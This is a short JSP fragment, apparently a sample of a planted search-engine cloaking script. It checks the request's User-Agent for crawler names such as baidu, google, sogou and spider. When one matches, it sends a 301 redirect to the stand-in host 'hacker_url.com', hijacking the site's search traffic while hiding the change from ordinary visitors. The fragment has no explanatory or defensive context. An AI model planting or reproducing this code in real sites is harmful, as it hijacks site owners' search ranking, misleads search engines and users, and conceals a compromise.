<%
String s = request.getHeader("User-Agent");
if(s.indexOf("baidu")>-1 || s.indexOf("soso")>-1|| s.indexOf("google")>-1 || s.indexOf("360")>-1 || s.indexOf("sogou")>-1 || s.indexOf("spider") > -1) {
    response.setStatus(301);
    response.setHeader( "Location", "http://www.hacker_url.com/" );
    response.setHeader( "Connection", "close" );
}
%>